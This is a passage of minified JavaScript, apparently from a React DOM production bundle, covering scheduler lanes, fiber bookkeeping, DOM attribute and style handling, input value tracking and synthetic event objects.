                    case "svg":
                        i = 1;
                        break;
                    case "math":
                        i = 2;
                        break;
                    default:
                        i = 0
                    }
            }
            ne(re),
            ae(re, i)
        }
        function vt() {
            ne(re),
            ne(he),
            ne(ye)
        }
        function Bn(i) {
            i.memoizedState !== null && ae(ut, i);
            var r = re.current
              , a = hb(r, i.type);
            r !== a && (ae(he, i),
            ae(re, a))
        }
        function rn(i) {
            he.current === i && (ne(re),
            ne(he)),
            ut.current === i && (ne(ut),
            ol._currentValue = J)
        }
        var Pt = Object.prototype.hasOwnProperty
          , Cn = t.unstable_scheduleCallback
          , In = t.unstable_cancelCallback
          , cr = t.unstable_shouldYield
          , js = t.unstable_requestPaint
          , gn = t.unstable_now
          , uf = t.unstable_getCurrentPriorityLevel
          , po = t.unstable_ImmediatePriority
          , K = t.unstable_UserBlockingPriority
          , Ps = t.unstable_NormalPriority
          , go = t.unstable_LowPriority
          , Kt = t.unstable_IdlePriority
          , ue = t.log
          , be = t.unstable_setDisableYieldValue
          , ct = null
          , st = null;
        function ke(i) {
            if (typeof ue == "function" && be(i),
            st && typeof st.setStrictMode == "function")
                try {
                    st.setStrictMode(ct, i)
                } catch {}
        }
        var dt = Math.clz32 ? Math.clz32 : df
          , Vn = Math.log
          , Z0 = Math.LN2;
        function df(i) {
            return i >>>= 0,
            i === 0 ? 32 : 31 - (Vn(i) / Z0 | 0) | 0
        }
        var Hs = 256
          , zs = 4194304;
        function Si(i) {
            var r = i & 42;
            if (r !== 0)
                return r;
            switch (i & -i) {
            case 1:
                return 1;
            case 2:
                return 2;
            case 4:
                return 4;
            case 8:
                return 8;
            case 16:
                return 16;
            case 32:
                return 32;
            case 64:
                return 64;
            case 128:
                return 128;
            case 256:
            case 512:
            case 1024:
            case 2048:
            case 4096:
            case 8192:
            case 16384:
            case 32768:
            case 65536:
            case 131072:
            case 262144:
            case 524288:
            case 1048576:
            case 2097152:
                return i & 4194048;
            case 4194304:
            case 8388608:
            case 16777216:
            case 33554432:
                return i & 62914560;
            case 67108864:
                return 67108864;
            case 134217728:
                return 134217728;
            case 268435456:
                return 268435456;
            case 536870912:
                return 536870912;
            case 1073741824:
                return 0;
            default:
                return i
            }
        }
        function ri(i, r, a) {
            var c = i.pendingLanes;
            if (c === 0)
                return 0;
            var f = 0
              , g = i.suspendedLanes
              , v = i.pingedLanes;
            i = i.warmLanes;
            var A = c & 134217727;
            return A !== 0 ? (c = A & ~g,
            c !== 0 ? f = Si(c) : (v &= A,
            v !== 0 ? f = Si(v) : a || (a = A & ~i,
            a !== 0 && (f = Si(a))))) : (A = c & ~g,
            A !== 0 ? f = Si(A) : v !== 0 ? f = Si(v) : a || (a = c & ~i,
            a !== 0 && (f = Si(a)))),
            f === 0 ? 0 : r !== 0 && r !== f && (r & g) === 0 && (g = f & -f,
            a = r & -r,
            g >= a || g === 32 && (a & 4194048) !== 0) ? r : f
        }
        function Yn(i, r) {
            return (i.pendingLanes & ~(i.suspendedLanes & ~i.pingedLanes) & r) === 0
        }
        function TE(i, r) {
            switch (i) {
            case 1:
            case 2:
            case 4:
            case 8:
            case 64:
                return r + 250;
            case 16:
            case 32:
            case 128:
            case 256:
            case 512:
            case 1024:
            case 2048:
            case 4096:
            case 8192:
            case 16384:
            case 32768:
            case 65536:
            case 131072:
            case 262144:
            case 524288:
            case 1048576:
            case 2097152:
                return r + 5e3;
            case 4194304:
            case 8388608:
            case 16777216:
            case 33554432:
                return -1;
            case 67108864:
            case 134217728:
            case 268435456:
            case 536870912:
            case 1073741824:
                return -1;
            default:
                return -1
            }
        }
        function K0() {
            var i = Hs;
            return Hs <<= 1,
            (Hs & 4194048) === 0 && (Hs = 256),
            i
        }
        function X0() {
            var i = zs;
            return zs <<= 1,
            (zs & 62914560) === 0 && (zs = 4194304),
            i
        }
        function ff(i) {
            for (var r = [], a = 0; 31 > a; a++)
                r.push(i);
            return r
        }
        function yo(i, r) {
            i.pendingLanes |= r,
            r !== 268435456 && (i.suspendedLanes = 0,
            i.pingedLanes = 0,
            i.warmLanes = 0)
        }
        function RE(i, r, a, c, f, g) {
            var v = i.pendingLanes;
            i.pendingLanes = a,
            i.suspendedLanes = 0,
            i.pingedLanes = 0,
            i.warmLanes = 0,
            i.expiredLanes &= a,
            i.entangledLanes &= a,
            i.errorRecoveryDisabledLanes &= a,
            i.shellSuspendCounter = 0;
            var A = i.entanglements
              , C = i.expirationTimes
              , j = i.hiddenUpdates;
            for (a = v & ~a; 0 < a; ) {
                var V = 31 - dt(a)
                  , $ = 1 << V;
                A[V] = 0,
                C[V] = -1;
                var H = j[V];
                if (H !== null)
                    for (j[V] = null,
                    V = 0; V < H.length; V++) {
                        var G = H[V];
                        G !== null && (G.lane &= -536870913)
                    }
                a &= ~$
            }
            c !== 0 && J0(i, c, 0),
            g !== 0 && f === 0 && i.tag !== 0 && (i.suspendedLanes |= g & ~(v & ~r))
        }
        function J0(i, r, a) {
            i.pendingLanes |= r,
            i.suspendedLanes &= ~r;
            var c = 31 - dt(r);
            i.entangledLanes |= r,
            i.entanglements[c] = i.entanglements[c] | 1073741824 | a & 4194090
        }
        function $0(i, r) {
            var a = i.entangledLanes |= r;
            for (i = i.entanglements; a; ) {
                var c = 31 - dt(a)
                  , f = 1 << c;
                f & r | i[c] & r && (i[c] |= r),
                a &= ~f
            }
        }
        function hf(i) {
            switch (i) {
            case 2:
                i = 1;
                break;
            case 8:
                i = 4;
                break;
            case 32:
                i = 16;
                break;
            case 256:
            case 512:
            case 1024:
            case 2048:
            case 4096:
            case 8192:
            case 16384:
            case 32768:
            case 65536:
            case 131072:
            case 262144:
            case 524288:
            case 1048576:
            case 2097152:
            case 4194304:
            case 8388608:
            case 16777216:
            case 33554432:
                i = 128;
                break;
            case 268435456:
                i = 134217728;
                break;
            default:
                i = 0
            }
            return i
        }
        function mf(i) {
            return i &= -i,
            2 < i ? 8 < i ? (i & 134217727) !== 0 ? 32 : 268435456 : 8 : 2
        }
        function W0() {
            var i = P.p;
            return i !== 0 ? i : (i = window.event,
            i === void 0 ? 32 : Ob(i.type))
        }
        function BE(i, r) {
            var a = P.p;
            try {
                return P.p = i,
                r()
            } finally {
                P.p = a
            }
        }
        var ur = Math.random().toString(36).slice(2)
          , qt = "__reactFiber$" + ur
          , sn = "__reactProps$" + ur
          , Gs = "__reactContainer$" + ur
          , pf = "__reactEvents$" + ur
          , CE = "__reactListeners$" + ur
          , IE = "__reactHandles$" + ur
          , eg = "__reactResources$" + ur
          , vo = "__reactMarker$" + ur;
        function gf(i) {
            delete i[qt],
            delete i[sn],
            delete i[pf],
            delete i[CE],
            delete i[IE]
        }
        function qs(i) {
            var r = i[qt];
            if (r)
                return r;
            for (var a = i.parentNode; a; ) {
                if (r = a[Gs] || a[qt]) {
                    if (a = r.alternate,
                    r.child !== null || a !== null && a.child !== null)
                        for (i = yb(i); i !== null; ) {
                            if (a = i[qt])
                                return a;
                            i = yb(i)
                        }
                    return r
                }
                i = a,
                a = i.parentNode
            }
            return null
        }
        function Fs(i) {
            if (i = i[qt] || i[Gs]) {
                var r = i.tag;
                if (r === 5 || r === 6 || r === 13 || r === 26 || r === 27 || r === 3)
                    return i
            }
            return null
        }
        function bo(i) {
            var r = i.tag;
            if (r === 5 || r === 26 || r === 27 || r === 6)
                return i.stateNode;
            throw Error(s(33))
        }
        function Qs(i) {
            var r = i[eg];
            return r || (r = i[eg] = {
                hoistableStyles: new Map,
                hoistableScripts: new Map
            }),
            r
        }
        function Ot(i) {
            i[vo] = !0
        }
        var tg = new Set
          , ng = {};
        function Zr(i, r) {
            Vs(i, r),
            Vs(i + "Capture", r)
        }
        function Vs(i, r) {
            for (ng[i] = r,
            i = 0; i < r.length; i++)
                tg.add(r[i])
        }
        var kE = RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$")
          , ig = {}
          , rg = {};
        function OE(i) {
            return Pt.call(rg, i) ? !0 : Pt.call(ig, i) ? !1 : kE.test(i) ? rg[i] = !0 : (ig[i] = !0,
            !1)
        }
        function mc(i, r, a) {
            if (OE(r))
                if (a === null)
                    i.removeAttribute(r);
                else {
                    switch (typeof a) {
                    case "undefined":
                    case "function":
                    case "symbol":
                        i.removeAttribute(r);
                        return;
                    case "boolean":
                        var c = r.toLowerCase().slice(0, 5);
                        if (c !== "data-" && c !== "aria-") {
                            i.removeAttribute(r);
                            return
                        }
                    }
                    i.setAttribute(r, "" + a)
                }
        }
        function pc(i, r, a) {
            if (a === null)
                i.removeAttribute(r);
            else {
                switch (typeof a) {
                case "undefined":
                case "function":
                case "symbol":
                case "boolean":
                    i.removeAttribute(r);
                    return
                }
                i.setAttribute(r, "" + a)
            }
        }
        function Ti(i, r, a, c) {
            if (c === null)
                i.removeAttribute(a);
            else {
                switch (typeof c) {
                case "undefined":
                case "function":
                case "symbol":
                case "boolean":
                    i.removeAttribute(a);
                    return
                }
                i.setAttributeNS(r, a, "" + c)
            }
        }
        var yf, sg;
        function Ys(i) {
            if (yf === void 0)
                try {
                    throw Error()
                } catch (a) {
                    var r = a.stack.trim().match(/\n( *(at )?)/);
                    yf = r && r[1] || "",
                    sg = -1 < a.stack.indexOf(`
    at`) ? " (<anonymous>)" : -1 < a.stack.indexOf("@") ? "@unknown:0:0" : ""
                }
            return `
` + yf + i + sg
        }
        var vf = !1;
        function bf(i, r) {
            if (!i || vf)
                return "";
            vf = !0;
            var a = Error.prepareStackTrace;
            Error.prepareStackTrace = void 0;
            try {
                var c = {
                    DetermineComponentFrameRoot: function() {
                        try {
                            if (r) {
                                var $ = function() {
                                    throw Error()
                                };
                                if (Object.defineProperty($.prototype, "props", {
                                    set: function() {
                                        throw Error()
                                    }
                                }),
                                typeof Reflect == "object" && Reflect.construct) {
                                    try {
                                        Reflect.construct($, [])
                                    } catch (G) {
                                        var H = G
                                    }
                                    Reflect.construct(i, [], $)
                                } else {
                                    try {
                                        $.call()
                                    } catch (G) {
                                        H = G
                                    }
                                    i.call($.prototype)
                                }
                            } else {
                                try {
                                    throw Error()
                                } catch (G) {
                                    H = G
                                }
                                ($ = i()) && typeof $.catch == "function" && $.catch(function() {})
                            }
                        } catch (G) {
                            if (G && H && typeof G.stack == "string")
                                return [G.stack, H.stack]
                        }
                        return [null, null]
                    }
                };
                c.DetermineComponentFrameRoot.displayName = "DetermineComponentFrameRoot";
                var f = Object.getOwnPropertyDescriptor(c.DetermineComponentFrameRoot, "name");
                f && f.configurable && Object.defineProperty(c.DetermineComponentFrameRoot, "name", {
                    value: "DetermineComponentFrameRoot"
                });
                var g = c.DetermineComponentFrameRoot()
                  , v = g[0]
                  , A = g[1];
                if (v && A) {
                    var C = v.split(`
`)
                      , j = A.split(`
`);
                    for (f = c = 0; c < C.length && !C[c].includes("DetermineComponentFrameRoot"); )
                        c++;
                    for (; f < j.length && !j[f].includes("DetermineComponentFrameRoot"); )
                        f++;
                    if (c === C.length || f === j.length)
                        for (c = C.length - 1,
                        f = j.length - 1; 1 <= c && 0 <= f && C[c] !== j[f]; )
                            f--;
                    for (; 1 <= c && 0 <= f; c--,
                    f--)
                        if (C[c] !== j[f]) {
                            if (c !== 1 || f !== 1)
                                do
                                    if (c--,
                                    f--,
                                    0 > f || C[c] !== j[f]) {
                                        var V = `
` + C[c].replace(" at new ", " at ");
                                        return i.displayName && V.includes("<anonymous>") && (V = V.replace("<anonymous>", i.displayName)),
                                        V
                                    }
                                while (1 <= c && 0 <= f);
                            break
                        }
                }
            } finally {
                vf = !1,
                Error.prepareStackTrace = a
            }
            return (a = i ? i.displayName || i.name : "") ? Ys(a) : ""
        }
        function NE(i) {
            switch (i.tag) {
            case 26:
            case 27:
            case 5:
                return Ys(i.type);
            case 16:
                return Ys("Lazy");
            case 13:
                return Ys("Suspense");
            case 19:
                return Ys("SuspenseList");
            case 0:
            case 15:
                return bf(i.type, !1);
            case 11:
                return bf(i.type.render, !1);
            case 1:
                return bf(i.type, !0);
            case 31:
                return Ys("Activity");
            default:
                return ""
            }
        }
        function ag(i) {
            try {
                var r = "";
                do
                    r += NE(i),
                    i = i.return;
                while (i);
                return r
            } catch (a) {
                return `
Error generating stack: ` + a.message + `
` + a.stack
            }
        }
        function kn(i) {
            switch (typeof i) {
            case "bigint":
            case "boolean":
            case "number":
            case "string":
            case "undefined":
                return i;
            case "object":
                return i;
            default:
                return ""
            }
        }
        function og(i) {
            var r = i.type;
            return (i = i.nodeName) && i.toLowerCase() === "input" && (r === "checkbox" || r === "radio")
        }
        function ME(i) {
            var r = og(i) ? "checked" : "value"
              , a = Object.getOwnPropertyDescriptor(i.constructor.prototype, r)
              , c = "" + i[r];
            if (!i.hasOwnProperty(r) && typeof a < "u" && typeof a.get == "function" && typeof a.set == "function") {
                var f = a.get
                  , g = a.set;
                return Object.defineProperty(i, r, {
                    configurable: !0,
                    get: function() {
                        return f.call(this)
                    },
                    set: function(v) {
                        c = "" + v,
                        g.call(this, v)
                    }
                }),
                Object.defineProperty(i, r, {
                    enumerable: a.enumerable
                }),
                {
                    getValue: function() {
                        return c
                    },
                    setValue: function(v) {
                        c = "" + v
                    },
                    stopTracking: function() {
                        i._valueTracker = null,
                        delete i[r]
                    }
                }
            }
        }
        function gc(i) {
            i._valueTracker || (i._valueTracker = ME(i))
        }
        function lg(i) {
            if (!i)
                return !1;
            var r = i._valueTracker;
            if (!r)
                return !0;
            var a = r.getValue()
              , c = "";
            return i && (c = og(i) ? i.checked ? "true" : "false" : i.value),
            i = c,
            i !== a ? (r.setValue(i),
            !0) : !1
        }
        function yc(i) {
            if (i = i || (typeof document < "u" ? document : void 0),
            typeof i > "u")
                return null;
            try {
                return i.activeElement || i.body
            } catch {
                return i.body
            }
        }
        var DE = /[\n"\\]/g;
        function On(i) {
            return i.replace(DE, function(r) {
                return "\\" + r.charCodeAt(0).toString(16) + " "
            })
        }
        function Af(i, r, a, c, f, g, v, A) {
            i.name = "",
            v != null && typeof v != "function" && typeof v != "symbol" && typeof v != "boolean" ? i.type = v : i.removeAttribute("type"),
            r != null ? v === "number" ? (r === 0 && i.value === "" || i.value != r) && (i.value = "" + kn(r)) : i.value !== "" + kn(r) && (i.value = "" + kn(r)) : v !== "submit" && v !== "reset" || i.removeAttribute("value"),
            r != null ? wf(i, v, kn(r)) : a != null ? wf(i, v, kn(a)) : c != null && i.removeAttribute("value"),
            f == null && g != null && (i.defaultChecked = !!g),
            f != null && (i.checked = f && typeof f != "function" && typeof f != "symbol"),
            A != null && typeof A != "function" && typeof A != "symbol" && typeof A != "boolean" ? i.name = "" + kn(A) : i.removeAttribute("name")
        }
        function cg(i, r, a, c, f, g, v, A) {
            if (g != null && typeof g != "function" && typeof g != "symbol" && typeof g != "boolean" && (i.type = g),
            r != null || a != null) {
                if (!(g !== "submit" && g !== "reset" || r != null))
                    return;
                a = a != null ? "" + kn(a) : "",
                r = r != null ? "" + kn(r) : a,
                A || r === i.value || (i.value = r),
                i.defaultValue = r
            }
            c = c ?? f,
            c = typeof c != "function" && typeof c != "symbol" && !!c,
            i.checked = A ? i.checked : !!c,
            i.defaultChecked = !!c,
            v != null && typeof v != "function" && typeof v != "symbol" && typeof v != "boolean" && (i.name = v)
        }
        function wf(i, r, a) {
            r === "number" && yc(i.ownerDocument) === i || i.defaultValue === "" + a || (i.defaultValue = "" + a)
        }
        function Zs(i, r, a, c) {
            if (i = i.options,
            r) {
                r = {};
                for (var f = 0; f < a.length; f++)
                    r["$" + a[f]] = !0;
                for (a = 0; a < i.length; a++)
                    f = r.hasOwnProperty("$" + i[a].value),
                    i[a].selected !== f && (i[a].selected = f),
                    f && c && (i[a].defaultSelected = !0)
            } else {
                for (a = "" + kn(a),
                r = null,
                f = 0; f < i.length; f++) {
                    if (i[f].value === a) {
                        i[f].selected = !0,
                        c && (i[f].defaultSelected = !0);
                        return
                    }
                    r !== null || i[f].disabled || (r = i[f])
                }
                r !== null && (r.selected = !0)
            }
        }
        function ug(i, r, a) {
            if (r != null && (r = "" + kn(r),
            r !== i.value && (i.value = r),
            a == null)) {
                i.defaultValue !== r && (i.defaultValue = r);
                return
            }
            i.defaultValue = a != null ? "" + kn(a) : ""
        }
        function dg(i, r, a, c) {
            if (r == null) {
                if (c != null) {
                    if (a != null)
                        throw Error(s(92));
                    if (B(c)) {
                        if (1 < c.length)
                            throw Error(s(93));
                        c = c[0]
                    }
                    a = c
                }
                a == null && (a = ""),
                r = a
            }
            a = kn(r),
            i.defaultValue = a,
            c = i.textContent,
            c === a && c !== "" && c !== null && (i.value = c)
        }
        function Ks(i, r) {
            if (r) {
                var a = i.firstChild;
                if (a && a === i.lastChild && a.nodeType === 3) {
                    a.nodeValue = r;
                    return
                }
            }
            i.textContent = r
        }
        var LE = new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));
        function fg(i, r, a) {
            var c = r.indexOf("--") === 0;
            a == null || typeof a == "boolean" || a === "" ? c ? i.setProperty(r, "") : r === "float" ? i.cssFloat = "" : i[r] = "" : c ? i.setProperty(r, a) : typeof a != "number" || a === 0 || LE.has(r) ? r === "float" ? i.cssFloat = a : i[r] = ("" + a).trim() : i[r] = a + "px"
        }
        function hg(i, r, a) {
            if (r != null && typeof r != "object")
                throw Error(s(62));
            if (i = i.style,
            a != null) {
                for (var c in a)
                    !a.hasOwnProperty(c) || r != null && r.hasOwnProperty(c) || (c.indexOf("--") === 0 ? i.setProperty(c, "") : c === "float" ? i.cssFloat = "" : i[c] = "");
                for (var f in r)
                    c = r[f],
                    r.hasOwnProperty(f) && a[f] !== c && fg(i, f, c)
            } else
                for (var g in r)
                    r.hasOwnProperty(g) && fg(i, g, r[g])
        }
        function _f(i) {
            if (i.indexOf("-") === -1)
                return !1;
            switch (i) {
            case "annotation-xml":
            case "color-profile":
            case "font-face":
            case "font-face-src":
            case "font-face-uri":
            case "font-face-format":
            case "font-face-name":
            case "missing-glyph":
                return !1;
            default:
                return !0
            }
        }
        var UE = new Map([["acceptCharset", "accept-charset"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"], ["crossOrigin", "crossorigin"], ["accentHeight", "accent-height"], ["alignmentBaseline", "alignment-baseline"], ["arabicForm", "arabic-form"], ["baselineShift", "baseline-shift"], ["capHeight", "cap-height"], ["clipPath", "clip-path"], ["clipRule", "clip-rule"], ["colorInterpolation", "color-interpolation"], ["colorInterpolationFilters", "color-interpolation-filters"], ["colorProfile", "color-profile"], ["colorRendering", "color-rendering"], ["dominantBaseline", "dominant-baseline"], ["enableBackground", "enable-background"], ["fillOpacity", "fill-opacity"], ["fillRule", "fill-rule"], ["floodColor", "flood-color"], ["floodOpacity", "flood-opacity"], ["fontFamily", "font-family"], ["fontSize", "font-size"], ["fontSizeAdjust", "font-size-adjust"], ["fontStretch", "font-stretch"], ["fontStyle", "font-style"], ["fontVariant", "font-variant"], ["fontWeight", "font-weight"], ["glyphName", "glyph-name"], ["glyphOrientationHorizontal", "glyph-orientation-horizontal"], ["glyphOrientationVertical", "glyph-orientation-vertical"], ["horizAdvX", "horiz-adv-x"], ["horizOriginX", "horiz-origin-x"], ["imageRendering", "image-rendering"], ["letterSpacing", "letter-spacing"], ["lightingColor", "lighting-color"], ["markerEnd", "marker-end"], ["markerMid", "marker-mid"], ["markerStart", "marker-start"], ["overlinePosition", "overline-position"], ["overlineThickness", "overline-thickness"], ["paintOrder", "paint-order"], ["panose-1", "panose-1"], ["pointerEvents", "pointer-events"], ["renderingIntent", "rendering-intent"], ["shapeRendering", "shape-rendering"], ["stopColor", "stop-color"], ["stopOpacity", "stop-opacity"], ["strikethroughPosition", "strikethrough-position"], ["strikethroughThickness", "strikethrough-thickness"], ["strokeDasharray", "stroke-dasharray"], ["strokeDashoffset", "stroke-dashoffset"], ["strokeLinecap", "stroke-linecap"], ["strokeLinejoin", "stroke-linejoin"], ["strokeMiterlimit", "stroke-miterlimit"], ["strokeOpacity", "stroke-opacity"], ["strokeWidth", "stroke-width"], ["textAnchor", "text-anchor"], ["textDecoration", "text-decoration"], ["textRendering", "text-rendering"], ["transformOrigin", "transform-origin"], ["underlinePosition", "underline-position"], ["underlineThickness", "underline-thickness"], ["unicodeBidi", "unicode-bidi"], ["unicodeRange", "unicode-range"], ["unitsPerEm", "units-per-em"], ["vAlphabetic", "v-alphabetic"], ["vHanging", "v-hanging"], ["vIdeographic", "v-ideographic"], ["vMathematical", "v-mathematical"], ["vectorEffect", "vector-effect"], ["vertAdvY", "vert-adv-y"], ["vertOriginX", "vert-origin-x"], ["vertOriginY", "vert-origin-y"], ["wordSpacing", "word-spacing"], ["writingMode", "writing-mode"], ["xmlnsXlink", "xmlns:xlink"], ["xHeight", "x-height"]])
          , jE = /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
        function vc(i) {
            return jE.test("" + i) ? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')" : i
        }
        var Ef = null;
        function xf(i) {
            return i = i.target || i.srcElement || window,
            i.correspondingUseElement && (i = i.correspondingUseElement),
            i.nodeType === 3 ? i.parentNode : i
        }
        var Xs = null
          , Js = null;
        function mg(i) {
            var r = Fs(i);
            if (r && (i = r.stateNode)) {
                var a = i[sn] || null;
                e: switch (i = r.stateNode,
                r.type) {
                case "input":
                    if (Af(i, a.value, a.defaultValue, a.defaultValue, a.checked, a.defaultChecked, a.type, a.name),
                    r = a.name,
                    a.type === "radio" && r != null) {
                        for (a = i; a.parentNode; )
                            a = a.parentNode;
                        for (a = a.querySelectorAll('input[name="' + On("" + r) + '"][type="radio"]'),
                        r = 0; r < a.length; r++) {
                            var c = a[r];
                            if (c !== i && c.form === i.form) {
                                var f = c[sn] || null;
                                if (!f)
                                    throw Error(s(90));
                                Af(c, f.value, f.defaultValue, f.defaultValue, f.checked, f.defaultChecked, f.type, f.name)
                            }
                        }
                        for (r = 0; r < a.length; r++)
                            c = a[r],
                            c.form === i.form && lg(c)
                    }
                    break e;
                case "textarea":
                    ug(i, a.value, a.defaultValue);
                    break e;
                case "select":
                    r = a.value,
                    r != null && Zs(i, !!a.multiple, r, !1)
                }
            }
        }
        var Sf = !1;
        function pg(i, r, a) {
            if (Sf)
                return i(r, a);
            Sf = !0;
            try {
                var c = i(r);
                return c
            } finally {
                if (Sf = !1,
                (Xs !== null || Js !== null) && (iu(),
                Xs && (r = Xs,
                i = Js,
                Js = Xs = null,
                mg(r),
                i)))
                    for (r = 0; r < i.length; r++)
                        mg(i[r])
            }
        }
        function Ao(i, r) {
            var a = i.stateNode;
            if (a === null)
                return null;
            var c = a[sn] || null;
            if (c === null)
                return null;
            a = c[r];
            e: switch (r) {
            case "onClick":
            case "onClickCapture":
            case "onDoubleClick":
            case "onDoubleClickCapture":
            case "onMouseDown":
            case "onMouseDownCapture":
            case "onMouseMove":
            case "onMouseMoveCapture":
            case "onMouseUp":
            case "onMouseUpCapture":
            case "onMouseEnter":
                (c = !c.disabled) || (i = i.type,
                c = !(i === "button" || i === "input" || i === "select" || i === "textarea")),
                i = !c;
                break e;
            default:
                i = !1
            }
            if (i)
                return null;
            if (a && typeof a != "function")
                throw Error(s(231, r, typeof a));
            return a
        }
        var Ri = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u")
          , Tf = !1;
        if (Ri)
            try {
                var wo = {};
                Object.defineProperty(wo, "passive", {
                    get: function() {
                        Tf = !0
                    }
                }),
                window.addEventListener("test", wo, wo),
                window.removeEventListener("test", wo, wo)
            } catch {
                Tf = !1
            }
        var dr = null
          , Rf = null
          , bc = null;
        function gg() {
            if (bc)
                return bc;
            var i, r = Rf, a = r.length, c, f = "value"in dr ? dr.value : dr.textContent, g = f.length;
            for (i = 0; i < a && r[i] === f[i]; i++)
                ;
            var v = a - i;
            for (c = 1; c <= v && r[a - c] === f[g - c]; c++)
                ;
            return bc = f.slice(i, 1 < c ? 1 - c : void 0)
        }
        function Ac(i) {
            var r = i.keyCode;
            return "charCode"in i ? (i = i.charCode,
            i === 0 && r === 13 && (i = 13)) : i = r,
            i === 10 && (i = 13),
            32 <= i || i === 13 ? i : 0
        }
        function wc() {
            return !0
        }
        function yg() {
            return !1
        }
        function an(i) {
            function r(a, c, f, g, v) {
                this._reactName = a,
                this._targetInst = f,
                this.type = c,
                this.nativeEvent = g,
                this.target = v,
                this.currentTarget = null;
                for (var A in i)
                    i.hasOwnProperty(A) && (a = i[A],
                    this[A] = a ? a(g) : g[A]);
                return this.isDefaultPrevented = (g.defaultPrevented != null ? g.defaultPrevented : g.returnValue === !1) ? wc : yg,
                this.isPropagationStopped = yg,
                this
            }
            return m(r.prototype, {
                preventDefault: function() {
                    this.defaultPrevented = !0;
                    var a = this.nativeEvent;
                    a && (a.preventDefault ? a.preventDefault() : typeof a.returnValue != "unknown" && (a.returnValue = !1),
                    this.isDefaultPrevented = wc)
                },
                stopPropagation: function() {
                    var a = this.nativeEvent;
                    a && (a.stopPropagation ? a.stopPropagation() : typeof a.cancelBubble != "unknown" && (a.cancelBubble = !0),
                    this.isPropagationStopped = wc)
                },
                persist: function() {},
                isPersistent: wc
            }),
            r
        }
        var Kr = {
            eventPhase: 0,
            bubbles: 0,
            cancelable: 0,
            timeStamp: function(i) {
                return i.timeStamp || Date.now()
            },
            defaultPrevented: 0,
            isTrusted: 0
        }, _c = an(Kr), _o = m({}, Kr, {
            view: 0,
            detail: 0
        }), PE = an(_o), Bf, Cf, Eo, Ec = m({}, _o, {
            screenX: 0,
            screenY: 0,
            clientX: 0,
            clientY: 0,
            pageX: 0,
            pageY: 0,
            ctrlKey: 0,
            shiftKey: 0,
            altKey: 0,
            metaKey: 0,
            getModifierState: kf,
            button: 0,
            buttons: 0,
            relatedTarget: function(i) {
                return i.relatedTarget === void 0 ? i.fromElement === i.srcElement ? i.toElement : i.fromElement : i.relatedTarget
            },
            movementX: function(i) {
                return "movementX"in i ? i.movementX : (i !== Eo && (Eo && i.type === "mousemove" ? (Bf = i.screenX - Eo.screenX,
                Cf = i.screenY - Eo.screenY) : Cf = Bf = 0,
                Eo = i),
                Bf)
            },
            movementY: function(i) {
                return "movementY"in i ? i.movementY : Cf
            }
        }), vg = an(Ec), HE = m({}, Ec, {
            dataTransfer: 0
        }), zE = an(HE), GE = m({}, _o, {
            relatedTarget: 0
        }), If = an(GE), qE = m({}, Kr, {
            animationName: 0,
            elapsedTime: 0,
            pseudoElement: 0
        }), FE = an(qE), QE = m({}, Kr, {
            clipboardData: function(i) {
                return "clipboardData"in i ? i.clipboardData : window.clipboardData
            }
        }), VE = an(QE), YE = m({}, Kr, {
            data: 0
        }), bg = an(YE), ZE = {
            Esc: "Escape",
            Spacebar: " ",
            Left: "ArrowLeft",
            Up: "ArrowUp",
            Right: "ArrowRight",
            Down: "ArrowDown",
            Del: "Delete",
            Win: "OS",
            Menu: "ContextMenu",
            Apps: "ContextMenu",
            Scroll: "ScrollLock",
            MozPrintableKey: "Unidentified"
        }, KE = {
            8: "Backspace",
            9: "Tab",
            12: "Clear",
            13: "Enter",
            16: "Shift",
            17: "Control",
            18: "Alt",
            19: "Pause",
            20: "CapsLock",
            27: "Escape",
            32: " ",
            33: "PageUp",
            34: "PageDown",
            35: "End",
            36: "Home",
            37: "ArrowLeft",
            38: "ArrowUp",
            39: "ArrowRight",
            40: "ArrowDown",
            45: "Insert",
            46: "Delete",
            112: "F1",
            113: "F2",
            114: "F3",
            115: "F4",
            116: "F5",
            117: "F6",
            118: "F7",
            119: "F8",
            120: "F9",
            121: "F10",
            122: "F11",
            123: "F12",
            144: "NumLock",
            145: "ScrollLock",
            224: "Meta"
        }, XE = {
            Alt: "altKey",
            Control: "ctrlKey",
            Meta: "metaKey",
            Shift: "shiftKey"
        };
        function JE(i) {
            var r = this.nativeEvent;
            return r.getModifierState ? r.getModifierState(i) : (i = XE[i]) ? !!r[i] : !1
        }
        function kf() {
            return JE
        }
        var $E = m({}, _o, {
            key: function(i) {
                if (i.key) {
                    var r = ZE[i.key] || i.key;
                    if (r !== "Unidentified")
                        return r
                }
                return i.type === "keypress" ? (i = Ac(i),
